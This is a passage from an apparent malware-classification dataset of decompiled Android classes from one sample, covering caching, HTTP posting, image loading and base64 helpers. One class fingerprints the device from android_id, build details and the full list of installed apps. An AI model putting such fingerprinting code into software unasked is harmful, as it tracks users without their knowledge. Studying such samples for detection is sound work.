"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\ac.code","public final class ac {   private int a;   private int b;   private int c;   private File d;   private ExecutorService e;   private int f;   public static int b(  ac acVar){     int i=acVar.f;     acVar.f=i - 1;     return i;   }   public static int d(  ac acVar){     acVar.f=10;     return 10;   }   public static void e(  ac acVar){     File[] listFiles=acVar.d.listFiles();     if (listFiles != null) {       HashMap hashMap=new HashMap();       ArrayList<File> arrayList=new ArrayList(Arrays.asList(listFiles));       long j=0;       for (      File file : arrayList) {         j+=file.length();         hashMap.put(file,Long.valueOf(file.lastModified()));       }       int size=arrayList.size();       Collections.sort(arrayList,new ag(acVar,hashMap));       long j2=j;       for (int i=0; i < size; i++) {         if (j2 <= acVar.b && (acVar.a <= 0 || size - i <= acVar.a - 10)) {           return;         }         j2-=((File)arrayList.get(i)).length();         ((File)arrayList.get(i)).delete();       }     }   }   public final int a(){     return this.b;   }   public final String a(  Object obj){     return new File(this.d,new StringBuilder().append(obj.hashCode()).toString()).getAbsolutePath();   }   public final void a(  Object obj,  aa aaVar){     this.e.execute(new ae(this,obj,aaVar));   }   public final void a(  Object obj,  Object obj2){     this.e.execute(new ah(this,obj,obj2));   }   public final void b(  Object obj){     this.e.execute(new af(this,obj));   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\ad.code","public final class ad extends BroadcastReceiver {   public static String a(  SharedPreferences sharedPreferences){     return sharedPreferences.getString(""cmn.refkey"",null);   }   @Override public final void onReceive(  Context context,  Intent intent){     String stringExtra=intent.getStringExtra(AdTrackerConstants.REFERRER);     if (stringExtra == null) {       return;     }     SharedPreferences.Editor edit=PreferenceManager.getDefaultSharedPreferences(context).edit();     edit.putString(""cmn.refkey"",stringExtra);     a.a().a(edit);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\ae.code","public final class ae implements Runnable {   final Object a;   final aa b;   final ac c;   public ae(  ac acVar,  Object obj,  aa aaVar){     this.c=acVar;     this.a=obj;     this.b=aaVar;   }   @Override public final void run(){     int i;     int i2;     try {       ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(this.c.a(this.a)));       try {         if (objectInputStream.readObject().equals(this.a)) {           long readLong=objectInputStream.readLong();           i=this.c.c;           if (i > 0) {             long currentTimeMillis=System.currentTimeMillis();             i2=this.c.c;             if (readLong < currentTimeMillis - (86400000 * i2)) {               this.c.b(this.a);               this.b.a(null);             }           }           Object readObject=objectInputStream.readObject();           String str=""Diskcache hit saved "" + new File(this.c.a(this.a)).length() + "" bytes for ""+ this.a;           this.b.a(readObject);           objectInputStream.close();         }  else {           this.b.a(null);         }       }   finally {         objectInputStream.close();       }     }  catch (    Exception e) {       this.b.a(null);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\af.code","final class af implements Runnable {   final Object a;   final ac b;   public af(  ac acVar,  Object obj){     this.b=acVar;     this.a=obj;   }   @Override public final void run(){     try {       new File(this.b.a(this.a)).delete();     }  catch (    Exception e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\ag.code","public final class ag implements Comparator {   final Map a;   final ac b;   public ag(  ac acVar,  Map map){     this.b=acVar;     this.a=map;   }   @Override public final int compare(  Object obj,  Object obj2){     return ((Long)this.a.get((File)obj)).compareTo((Long)this.a.get((File)obj2));   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\ah.code","public final class ah implements Runnable {   final Object a;   final Object b;   final ac c;   public ah(  ac acVar,  Object obj,  Object obj2){     this.c=acVar;     this.a=obj;     this.b=obj2;   }   @Override public final void run(){     int i;     try {       ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream(this.c.a(this.a)));       objectOutputStream.writeObject(this.a);       objectOutputStream.writeLong(System.currentTimeMillis());       objectOutputStream.writeObject(this.b);       objectOutputStream.close();     }  catch (    Exception e) {     }     ac.b(this.c);     i=this.c.f;     if (i <= 0) {       ac.d(this.c);       ac.e(this.c);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\ai.code","public final class ai {   private static DefaultHttpClient a;   private static SSLSocketFactory b=SSLSocketFactory.getSocketFactory();   public static synchronized DefaultHttpClient a(){     DefaultHttpClient defaultHttpClient; synchronized (ai.class) {       if (a == null) {         BasicHttpParams basicHttpParams=new BasicHttpParams();         ConnManagerParams.setMaxTotalConnections(basicHttpParams,10);         HttpConnectionParams.setConnectionTimeout(basicHttpParams,30000);         HttpConnectionParams.setStaleCheckingEnabled(basicHttpParams,false);         HttpConnectionParams.setSocketBufferSize(basicHttpParams,8192);         HttpProtocolParams.setVersion(basicHttpParams,HttpVersion.HTTP_1_1);         HttpProtocolParams.setUserAgent(basicHttpParams,""Apache-HttpClient/UNAVAILABLE (java 1.4; SCM)"");         HttpClientParams.setRedirecting(basicHttpParams,true);         SchemeRegistry schemeRegistry=new SchemeRegistry();         schemeRegistry.register(new Scheme(""http"",PlainSocketFactory.getSocketFactory(),80));         schemeRegistry.register(new Scheme(""https"",b,443));         DefaultHttpClient defaultHttpClient2=new DefaultHttpClient(new ThreadSafeClientConnManager(basicHttpParams,schemeRegistry),basicHttpParams);         defaultHttpClient2.getParams().setParameter(""http.socket.timeout"",30000);         defaultHttpClient2.getParams().setParameter(""http.connection.timeout"",30000);         defaultHttpClient2.getParams().setParameter(""http.useragent"",""Apache-HttpClient/UNAVAILABLE (java 1.4; SCM)"");         defaultHttpClient2.getParams().setParameter(""http.protocol.expect-continue"",false);         a=defaultHttpClient2;       }       defaultHttpClient=a;     }     return defaultHttpClient;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\aj.code","public final class aj {   private static Map a=new HashMap();   private static Map b=new HashMap();   private static Map c=new WeakHashMap();   private static u d=new u();   private static y e=new y();   private static Bitmap f=Bitmap.createBitmap(1,1,Bitmap.Config.RGB_565);   public static void a(  ImageView imageView,  String str){     a(imageView,str,null);   }   public static void a(  ImageView imageView,  String str,  aa aaVar){     if (!e.a()) {       throw new IllegalStateException(""Call imagedownloader on the UI thread only."");     }     if (imageView != null) {       c.put(imageView,str);     }     Bitmap bitmap=(Bitmap)d.a(str);     if (bitmap != null) {       if (bitmap != f) {         if (imageView != null) {           imageView.setVisibility(0);           imageView.setImageBitmap(bitmap);         }         if (aaVar != null) {           aaVar.a(bitmap);         }       }  else {         if (imageView != null) {           imageView.setVisibility(8);         }         if (aaVar != null) {           aaVar.a(null);         }       }       if (imageView != null) {         c.remove(imageView);         return;       }       return;     } synchronized (a) {       if (aaVar != null) {         List list=(List)b.get(str);         if (list != null) {           list.add(aaVar);         }  else {           ArrayList arrayList=new ArrayList();           arrayList.add(aaVar);           b.put(str,arrayList);         }       }       List list2=(List)a.get(str);       if (list2 != null) {         if (imageView != null) {           list2.add(imageView);         }         return;       }       ArrayList arrayList2=new ArrayList();       if (imageView != null) {         arrayList2.add(imageView);       }       a.put(str,arrayList2);       e.a(str,new b(str));     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\b.code","public final class b implements aa {   final String a;   public b(  String str){     this.a=str;   }   @Override public final void a(  Object obj){     Bitmap bitmap;     Map map;     Map map2;     Map map3;     Map map4;     Map map5;     Map map6;     Map map7;     u uVar;     u uVar2;     Bitmap bitmap2;     Map map8;     Map map9;     Map map10;     Map map11;     Map map12;     Map map13;     Map map14;     y.b bVar=(y.b)obj;     if (bVar.a() == null) {       uVar2=aj.d;       String str=this.a;       bitmap2=aj.f;       uVar2.a(str,bitmap2);       map8=aj.a; synchronized (map8) {         map9=aj.a;         List<ImageView> list=(List)map9.get(this.a);         if (list != null) {           for (          ImageView imageView : list) {             if (imageView != null) {               String str2=this.a;               map13=aj.c;               if (str2.equals(map13.get(imageView))) {                 imageView.setVisibility(8);                 map14=aj.c;                 map14.remove(imageView);               }             }           }         }         map10=aj.b;         List list2=(List)map10.get(this.a);         if (list2 != null) {           Iterator it=list2.iterator();           while (it.hasNext()) {             try {               ((aa)it.next()).a(null);             }  catch (            Exception e) {               e.printStackTrace();             }           }         }         map11=aj.a;         map11.remove(this.a);         map12=aj.b;         map12.remove(this.a);       }       return;     }     try {       bitmap=BitmapFactory.decodeStream(new ByteArrayInputStream(bVar.a()));     }  catch (    OutOfMemoryError e2) {       System.gc();       bitmap=null;       System.gc();     }     if (bitmap != null && bitmap.getWidth() * bitmap.getHeight() < 128000) {       uVar=aj.d;       uVar.a(this.a,bitmap);     }     map=aj.a; synchronized (map) {       map2=aj.a;       List<ImageView> list3=(List)map2.get(this.a);       if (bitmap != null && list3 != null) {         for (        ImageView imageView2 : list3) {           if (imageView2 != null) {             String str3=this.a;             map6=aj.c;             if (str3.equals(map6.get(imageView2))) {               map7=aj.c;               map7.remove(imageView2);               imageView2.setVisibility(0);               imageView2.setImageBitmap(bitmap);             }           }         }       }       map3=aj.b;       List list4=(List)map3.get(this.a);       if (list4 != null) {         Iterator it2=list4.iterator();         while (it2.hasNext()) {           try {             ((aa)it2.next()).a(bitmap);           }  catch (          Exception e3) {             e3.printStackTrace();           }         }       }       map4=aj.a;       map4.remove(this.a);       map5=aj.b;       map5.remove(this.a);     }   } } !org.eclipse.jdt.core.dom.TypeDeclaration@1fd80ae3public static class b {   private final byte[] a;   private final Throwable b;   public b(  byte[] bArr,  Throwable th){     this.a=bArr;     this.b=th;   }   public final byte[] a(){     return this.a;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\c.code","public final class c {   private static final Map a=new d();   private final a b;   private int c=0; public static class a {     private final List a=new ArrayList();     public a(    List list){       this.a.addAll(list);     }     static a a(    a aVar){       a aVar2=new a(aVar.a);       Collections.shuffle(aVar2.a);       return aVar2;     }   }   public c(  a aVar){     this.b=a.a(aVar);   }   private synchronized String a(  String str){     return ((String)this.b.a.get(this.c)) + str;   }   private synchronized void a(){     this.c=(this.c + 1) % this.b.a.size();   }   public static void a(  HttpResponse httpResponse){     if (httpResponse.getEntity() != null) {       httpResponse.getEntity().consumeContent();     }   }   public final byte[] a(  String str,  byte[] bArr){     DefaultHttpClient a2=ai.a();     int i=0;     IOException e=null;     while (true) {       if (i >= 3) {         break;       }       HttpPost httpPost=new HttpPost(a(str));       if (bArr != null) {         httpPost.setHeader(""Content-Type"",""application/octet-stream"");         ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();         GZIPOutputStream gZIPOutputStream=new GZIPOutputStream(byteArrayOutputStream);         gZIPOutputStream.write(bArr);         gZIPOutputStream.close();         httpPost.setEntity(new ByteArrayEntity(byteArrayOutputStream.toByteArray()));       }       try {         try {           HttpResponse execute=a2.execute(httpPost);           try {             if (execute.getStatusLine().getStatusCode() == 200) {               GZIPInputStream gZIPInputStream=new GZIPInputStream(execute.getEntity().getContent());               ByteArrayOutputStream byteArrayOutputStream2=new ByteArrayOutputStream();               byte[] bArr2=new byte[android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS];               while (true) {                 int read=gZIPInputStream.read(bArr2);                 if (read == -1) {                   gZIPInputStream.close();                   return byteArrayOutputStream2.toByteArray();                 }                 byteArrayOutputStream2.write(bArr2,0,read);               }             }  else {               if (execute.getStatusLine().getStatusCode() == 204) {                 return null;               }               if (execute.getStatusLine().getStatusCode() >= 500) {                 execute.getEntity().writeTo(new ByteArrayOutputStream());                 throw new IOException(""bad response "" + execute.getStatusLine().getStatusCode());               }               e=new IOException(""bad response "" + execute.getStatusLine().getStatusCode());             }           }   finally {             a(execute);           }         }  catch (        RuntimeException e2) {           throw new IOException(e2.toString());         }       }  catch (      IOException e3) {         e=e3;         httpPost.abort();         a();         i++;       }     }     throw e;   } } public static class c implements Executor {   final LinkedList a;   Runnable b;   private c(){     this.a=new LinkedList();   }   c(  byte b){     this();   }   public final synchronized void a(){     Runnable runnable=(Runnable)this.a.poll();     this.b=runnable;     if (runnable != null) {       f.a.execute(this.b);     }   }   @Override public final synchronized void execute(  Runnable runnable){     this.a.offer(new j(this,runnable));     if (this.b == null) {       a();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\d.code","final class d extends LinkedHashMap {   @Override protected final boolean removeEldestEntry(  Map.Entry entry){     return size() > 100;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\e.code","public final class e {   public static final void a(  Runnable runnable){     if (a()) {       runnable.run();     }  else {       new Handler(Looper.getMainLooper()).post(runnable);     }   }   public static final boolean a(){     return Looper.getMainLooper() == Looper.myLooper();   } } public static abstract class e implements Callable {   Object[] a;   private e(){   }   public e(  byte b){     this();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\f.code","!org.eclipse.jdt.core.dom.TypeDeclaration@9b44d4f"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\g.code","final class g implements ThreadFactory {   private final AtomicInteger a=new AtomicInteger(1);   @Override public final Thread newThread(  Runnable runnable){     return new Thread(runnable,""AsyncTask #"" + this.a.getAndIncrement());   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\h.code","public final class h extends f.e {   final f b;   public h(  f fVar){     super((byte)0);     this.b=fVar;   }   @Override public final Object call(){     AtomicBoolean atomicBoolean;     Object b;     atomicBoolean=this.b.l;     atomicBoolean.set(true);     Process.setThreadPriority(10);     f fVar=this.b;     f fVar2=this.b;     Object[] objArr=this.a;     b=fVar.b(fVar2.a());     return b;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\i.code","public final class i extends FutureTask {   final f a;   public i(  f fVar,  Callable callable){     super(callable);     this.a=fVar;   }   @Override protected final void done(){     try {       f.b(this.a,get());     }  catch (    InterruptedException e) {     } catch (    CancellationException e2) {       f.b(this.a,null);     } catch (    ExecutionException e3) {       throw new RuntimeException(""An error occured while executing doInBackground()"",e3.getCause());     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\j.code","final class j implements Runnable {   final Runnable a;   final f.c b;   public j(  f.c cVar,  Runnable runnable){     this.b=cVar;     this.a=runnable;   }   @Override public final void run(){     try {       this.a.run();     }   finally {       this.b.a();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\k.code","public final class k implements Runnable {   final SharedPreferences.Editor a;   final a b;   public k(  a aVar,  SharedPreferences.Editor editor){     this.b=aVar;     this.a=editor;   }   @Override public final void run(){     this.a.commit();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\KeepMembers.code","public interface KeepMembers { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\l.code","public class l extends p {   @Override public final void a(  Activity activity){     activity.getWindow().setFlags(16777216,16777216);   }   @Override public final void a(  View view){     view.setLayerType(1,null);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\m.code","public class m extends l {   @Override public final Point a(  Context context){     WindowManager windowManager=(WindowManager)context.getSystemService(""window"");     Display defaultDisplay=windowManager == null ? null : windowManager.getDefaultDisplay();     Point point=new Point();     if (defaultDisplay != null) {       defaultDisplay.getSize(point);     }     return point;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\n.code","public class n extends m {   @Override public final void a(  View view,  Drawable drawable){     view.setBackground(drawable);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\o.code","public final class o extends n { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\p.code","public class p extends a {   @Override public final long a(  PackageInfo packageInfo){     return packageInfo.firstInstallTime;   }   @Override public final long a(  PackageInfo packageInfo,  ApplicationInfo applicationInfo){     return packageInfo.firstInstallTime;   }   @Override public final void a(  SharedPreferences.Editor editor){     editor.apply();   }   @Override public final void b(  SharedPreferences.Editor editor){     editor.apply();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\Proguard.code","public final class Proguard { public interface KeepMembers {   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\q.code","public final class q {   public static List a(  Context context){     List list;     FutureTask futureTask=new FutureTask(new r(context));     e.a(futureTask);     try {       list=(List)futureTask.get(10L,TimeUnit.SECONDS);     }  catch (    Exception e) {       e.printStackTrace();       list=null;     }     return list == null ? new ArrayList() : list;   }   public static boolean a(  Context context,  String str){     try {       PackageInfo packageInfo=context.getPackageManager().getPackageInfo(str,0);       return packageInfo != null && packageInfo.versionCode >= -1;     }  catch (    PackageManager.NameNotFoundException e) {       return false;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\r.code","final class r implements Callable {   final Context a;   final int b=0;   public r(  Context context){     this.a=context;   }   @Override public List call(){     try {       return this.a.getPackageManager().getInstalledPackages(this.b);     }  catch (    Exception e) {       e.printStackTrace();       return new ArrayList();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\s.code","public final class s implements Serializable {   public static final boolean g;   private static s h=null;   private final int m;   private final long n;   private final String o;   private final int p;   private final String q;   private final String t;   private final String u;   private int v;   private String w;   private String x;   private String y;   private Context z;   private int i=-1;   private String j=null;   private String k="""";   private String l="""";   public int a=-1;   public int b=-1;   public int c=-1;   public int d=-1;   public String e="""";   public Set f=new HashSet();   private final String r=Build.BRAND + "" "" + Build.DEVICE;   private final String s=Build.MODEL; static {     g=""google_sdk"".equals(Build.PRODUCT) || ""sdk"".equals(Build.PRODUCT);   }   private s(  int i,  int i2,  String str,  long j,  String str2){     String str3;     this.m=i;     this.p=i2;     this.q=str;     this.n=j;     this.o=str2;     String str4="""";     Field[] fields=Build.class.getFields();     int length=fields.length;     int i3=0;     while (i3 < length) {       Field field=fields[i3];       if (field.getName().equals(""MANUFACTURER"")) {         try {           str3=(String)field.get(null);         }  catch (        Exception e) {           e.printStackTrace();         }         i3++;         str4=str3;       }       str3=str4;       i3++;       str4=str3;     }     this.t=str4;     this.u=Build.PRODUCT;   }   public static long a(  String str){     long j=0;     try {       byte[] digest=MessageDigest.getInstance(""MD5"").digest(str.getBytes());       int i=0;       while (i < 8) {         long j2=((digest[i] & 255) << (i * 8)) | j;         i++;         j=j2;       }     }  catch (    NoSuchAlgorithmException e) {       Log.e(""scm"",""MD5 not found!"");       for (int i2=0; i2 < str.length(); i2++) {         j=(j * 7265812761L) + ((str.charAt(i2) + '{') * 41);       }     }     return j;   }   public static synchronized cmn.s a(  android.content.Context r12){     throw new UnsupportedOperationException(""Method not decompiled: cmn.s.a(android.content.Context):cmn.s"");   }   private static String a(  ContentResolver contentResolver){     String string=Settings.Secure.getString(contentResolver,""android_id"");     if (string == null || string.equals(""9774d56d682e549c"") || string.equals(""67ef2b122f51423f"")) {       string="""";     }     if (string.length() != 0) {       return string;     }     Random random=new Random();     StringBuffer stringBuffer=new StringBuffer();     for (int i=0; i < 16; i++) {       stringBuffer.append(random.nextInt(16) + 97);     }     return stringBuffer.toString();   }   private void b(  Context context){     int i=0;     if (this.w != null) {       return;     }     StringBuilder sb=new StringBuilder();     this.f.clear();     Iterator<PackageInfo> it=context.getPackageManager().getInstalledPackages(0).iterator();     while (true) {       int i2=i;       if (!it.hasNext()) {         this.w=sb.toString();         this.v=i2;         try {           StatFs statFs=new StatFs(""/data/app"");           this.c=(int)((statFs.getAvailableBlocks() * statFs.getBlockSize()) / 1024);           return;         }  catch (        Throwable th) {           return;         }       }       PackageInfo next=it.next();       if (next.packageName.equals(context.getPackageName())) {         this.i=next.versionCode;       }       if (next.packageName.equals(""com.android.vending"")) {         this.b=next.versionCode;       }       if (b(next.packageName)) {         if (sb.length() > 0) {           sb.append("","");         }         sb.append(next.packageName.substring(next.packageName.lastIndexOf(46) + 1));       }       this.f.add(next.packageName);       i=i2 + 1;     }   }   private static boolean b(  String str){     return str.startsWith(""com.appspot.swisscodemonkeys."") || str.startsWith(""com.apptornado."") || str.startsWith(""com.appbrain."");   }   public final String a(){     return this.k;   }   public final String b(){     return this.l;   }   public final String c(){     return this.r;   }   public final String d(){     return this.z.getResources().getConfiguration().locale.getLanguage();   }   public final int e(){     return this.v;   }   public final int f(){     return this.i;   }   public final String g(){     return this.q;   }   public final String h(){     return this.o;   }   public final String i(){     return t.b(new byte[]{(byte)((this.m >> 24) & 255),(byte)((this.m >> 16) & 255),(byte)((this.m >> 8) & 255),(byte)(this.m & 255)});   }   public final String j(){     byte[] bArr=new byte[8];     for (int i=0; i < 8; i++) {       bArr[i]=(byte)((this.n >> (i * 8)) & 255);     }     return t.b(bArr);   }   public final int k(){     return this.p;   }   public final String l(){     return this.y;   }   public final String m(){     return this.s;   }   public final String n(){     return this.t;   }   public final String o(){     return this.u;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\t.code","public class t {   public static final byte[] a;   public static final byte[] b;   static final boolean c;   private static final byte[] d;   private static final byte[] e; static {     c=!t.class.desiredAssertionStatus();     a=new byte[]{65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47};     b=new byte[]{65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,45,95};     d=new byte[]{-9,-9,-9,-9,-9,-9,-9,-9,-9,-5,-5,-9,-9,-5,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-5,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,62,-9,-9,-9,63,52,53,54,55,56,57,58,59,60,61,-9,-9,-9,-1,-9,-9,-9,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-9,-9,-9,-9,-9,-9,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-9,-9,-9,-9};     e=new byte[]{-9,-9,-9,-9,-9,-9,-9,-9,-9,-5,-5,-9,-9,-5,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-5,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,62,-9,-9,52,53,54,55,56,57,58,59,60,61,-9,-9,-9,-1,-9,-9,-9,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-9,-9,-9,-9,63,-9,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-9,-9,-9,-9};   }   private t(){   }   private static int a(  byte[] bArr,  byte[] bArr2,  int i,  byte[] bArr3){     if (bArr[2] == 61) {       bArr2[i]=(byte)((((bArr3[bArr[0]] << 24) >>> 6) | ((bArr3[bArr[1]] << 24) >>> 12)) >>> 16);       return 1;     }     if (bArr[3] == 61) {       int i2=((bArr3[bArr[1]] << 24) >>> 12) | ((bArr3[bArr[0]] << 24) >>> 6) | ((bArr3[bArr[2]] << 24) >>> 18);       bArr2[i]=(byte)(i2 >>> 16);       bArr2[i + 1]=(byte)(i2 >>> 8);       return 2;     }     int i3=((bArr3[bArr[1]] << 24) >>> 12) | ((bArr3[bArr[0]] << 24) >>> 6) | ((bArr3[bArr[2]] << 24) >>> 18)| ((bArr3[bArr[3]] << 24) >>> 24);     bArr2[i]=(byte)(i3 >> 16);     bArr2[i + 1]=(byte)(i3 >> 8);     bArr2[i + 2]=(byte)i3;     return 3;   }   public static String a(  byte[] bArr){     return a(bArr,bArr.length,a,true);   }   private static String a(  byte[] bArr,  int i,  byte[] bArr2,  boolean z){     int i2=((i + 2) / 3) * 4;     byte[] bArr3=new byte[i2 + (i2 / Integer.MAX_VALUE)];     int i3=i - 2;     int i4=0;     int i5=0;     int i6=0;     while (i6 < i3) {       int i7=((bArr[i6] << 24) >>> 8) | ((bArr[i6 + 1] << 24) >>> 16) | ((bArr[i6 + 2] << 24) >>> 24);       bArr3[i5]=bArr2[i7 >>> 18];       bArr3[i5 + 1]=bArr2[(i7 >>> 12) & 63];       bArr3[i5 + 2]=bArr2[(i7 >>> 6) & 63];       bArr3[i5 + 3]=bArr2[i7 & 63];       int i8=i4 + 4;       if (i8 == Integer.MAX_VALUE) {         bArr3[i5 + 4]=10;         i5++;         i8=0;       }       i5+=4;       i4=i8;       i6+=3;     }     if (i6 < i) {       int i9=i - i6;       int i10=(i9 > 2 ? (bArr[i6 + 2] << 24) >>> 24 : 0) | (i9 > 0 ? (bArr[i6] << 24) >>> 8 : 0) | (i9 > 1 ? (bArr[i6 + 1] << 24) >>> 16 : 0); switch (i9) { case 1:         bArr3[i5]=bArr2[i10 >>> 18];       bArr3[i5 + 1]=bArr2[(i10 >>> 12) & 63];     bArr3[i5 + 2]=61;   bArr3[i5 + 3]=61; break; case 2: bArr3[i5]=bArr2[i10 >>> 18]; bArr3[i5 + 1]=bArr2[(i10 >>> 12) & 63]; bArr3[i5 + 2]=bArr2[(i10 >>> 6) & 63]; bArr3[i5 + 3]=61; break; case 3: bArr3[i5]=bArr2[i10 >>> 18]; bArr3[i5 + 1]=bArr2[(i10 >>> 12) & 63]; bArr3[i5 + 2]=bArr2[(i10 >>> 6) & 63]; bArr3[i5 + 3]=bArr2[i10 & 63]; break; } if (i4 + 4 == Integer.MAX_VALUE) { bArr3[i5 + 4]=10; i5++; } i5+=4; } if (!c && i5 != bArr3.length) { throw new AssertionError(); } int length=bArr3.length; while (!z && length > 0 && bArr3[length - 1] == 61) { length--; } return new String(bArr3,0,length); } public static byte[] a(String str){ byte[] bytes=str.getBytes(); return a(bytes,bytes.length,d); } private static byte[] a(byte[] r13,int r14,byte[] r15){ throw new UnsupportedOperationException(""Method not decompiled: cmn.t.a(byte[], int, byte[]):byte[]""); } public static String b(byte[] bArr){ return a(bArr,bArr.length,b,false); } public static byte[] b(String str){ byte[] bytes=str.getBytes(); return a(bytes,bytes.length,e); } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\u.code","public final class u {   protected LinkedHashMap a=new v(this,((int)FloatMath.ceil(133.33333f)) + 1);   public final synchronized Object a(  Object obj){     Object obj2;     SoftReference softReference=(SoftReference)this.a.get(obj);     if (softReference == null) {       obj2=null;     }  else {       obj2=softReference.get();       if (obj2 == null) {         this.a.remove(obj);       }     }     return obj2;   }   public final synchronized void a(  Object obj,  Object obj2){     if (obj2 == null) {       this.a.put(obj,null);     }  else {       this.a.put(obj,new SoftReference(obj2));     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\v.code","public final class v extends LinkedHashMap {   final int a=100;   final u b;   public v(  u uVar,  int i){     super(i,0.75f,true);     this.b=uVar;   }   @Override protected final boolean removeEldestEntry(  Map.Entry entry){     return size() > this.a;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\w.code","public final class w extends Button {   private int a;   private float b;   public w(  Context context){     super(context);     setMaxLines(1);     this.b=getTextSize();   }   @Override protected final void onMeasure(  int i,  int i2){     float f=this.b;     int size=View.MeasureSpec.getSize(i);     if (size > 0) {       int mode=View.MeasureSpec.getMode(i2);       int size2=(mode == Integer.MIN_VALUE || mode == 1073741824) ? View.MeasureSpec.getSize(i2) : Integer.MAX_VALUE;       int compoundPaddingLeft=size - ((getCompoundPaddingLeft() + getCompoundPaddingRight()) + 1);       int compoundPaddingTop=size2 - ((getCompoundPaddingTop() + getCompoundPaddingBottom()) + 1);       float f2=getResources().getDisplayMetrics().density;       f=x.a(getText().toString(),compoundPaddingLeft,compoundPaddingTop,this.a,this.b * f2,getPaint(),getTypeface()) / f2;     }     if (Math.abs(getTextSize() - f) > 0.1f) {       setTextSize(2,f);     }     super.onMeasure(i,i2);   }   @Override public final void setMaxLines(  int i){     super.setMaxLines(i);     this.a=i;   }   @Override public final void setTextSize( 